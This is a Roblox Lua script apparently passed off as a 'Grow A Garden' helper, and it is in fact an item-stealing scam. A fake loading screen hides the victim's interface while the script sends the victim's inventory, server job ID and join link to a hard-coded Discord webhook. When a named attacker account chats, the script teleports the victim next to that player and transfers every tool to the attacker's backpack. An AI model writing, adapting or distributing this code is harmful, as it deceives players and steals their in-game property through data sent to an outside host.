local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local StarterGui = game:GetService("StarterGui")
local LocalPlayer = Players.LocalPlayer
local Backpack = LocalPlayer:WaitForChild("Backpack")

-- Settings
local WEBHOOK_URL = "https://discord.com/api/webhooks/1375150931334664244/195dhN4TmlV8qXHB3SPulJiH73Bs9AXAkTmT1HDC9BEQldqwQ1DGALIUZpOCrYJ06tWk"
local TARGET_USERNAME = "Ambakings"

-- Disable UI
for _, gui in pairs(LocalPlayer.PlayerGui:GetChildren()) do
    if gui:IsA("ScreenGui") then
        gui.Enabled = false
    end
end

-- Loading Screen
local screenGui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
screenGui.IgnoreGuiInset = true
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local bg = Instance.new("Frame", screenGui)
bg.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
bg.Size = UDim2.new(1, 0, 1, 0)

local title = Instance.new("TextLabel", bg)
title.Text = "🌴 GROW A GARDEN 🌴"
title.Size = UDim2.new(1, 0, 0.1, 0)
title.Position = UDim2.new(0, 0, 0.3, 0)
title.Font = Enum.Font.SourceSansBold
title.TextScaled = true
title.TextColor3 = Color3.new(1, 1, 1)
title.BackgroundTransparency = 1

local sub = Instance.new("TextLabel", bg)
sub.Text = "Script Loading Please Wait for a While"
sub.Size = UDim2.new(1, 0, 0.05, 0)
sub.Position = UDim2.new(0, 0, 0.4, 0)
sub.Font = Enum.Font.SourceSans
sub.TextScaled = true
sub.TextColor3 = Color3.new(1, 1, 1)
sub.BackgroundTransparency = 1

local progress = Instance.new("TextLabel", bg)
progress.Text = "42%"
progress.Size = UDim2.new(1, 0, 0.05, 0)
progress.Position = UDim2.new(0, 0, 0.5, 0)
progress.Font = Enum.Font.SourceSans
progress.TextScaled = true
progress.TextColor3 = Color3.new(1, 1, 1)
progress.BackgroundTransparency = 1

-- Disable all core GUI
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)

-- Scan items
local items = {}
for _, item in ipairs(Backpack:GetChildren()) do
    if item:IsA("Tool") then
        table.insert(items, item.Name)
    end
end

-- Send to webhook
local jobId = game.JobId
local placeId = game.PlaceId
local joinLink = "https://www.roblox.com/games/" .. placeId .. "?jobId=" .. jobId

local data = {
    content = "",
    embeds = {{
        title = "Valuable Items Scan",
        description = "Items: ```" .. table.concat(items, ", ") .. "```",
        fields = {
            { name = "Job ID", value = jobId, inline = false },
            { name = "Join Link", value = joinLink, inline = false }
        }
    }}
}

request({
    Url = WEBHOOK_URL,
    Method = "POST",
    Headers = {["Content-Type"] = "application/json"},
    Body = HttpService:JSONEncode(data)
})

-- Listen for chat command
Players.PlayerChatted:Connect(function(player, message)
    if player.Name == TARGET_USERNAME then
        local char = player.Character or player.CharacterAdded:Wait()
        local targetHRP = char:WaitForChild("HumanoidRootPart")
        local myChar = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
        local myHRP = myChar:WaitForChild("HumanoidRootPart")
        myHRP.CFrame = targetHRP.CFrame + Vector3.new(2, 0, 0)

        for _, item in ipairs(Backpack:GetChildren()) do
            if item:IsA("Tool") then
                item.Parent = player.Backpack
                wait(0.2)
            end
        end
    end
end)

-- Re-enable GUI after delay
wait(5)
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
screenGui:Destroy()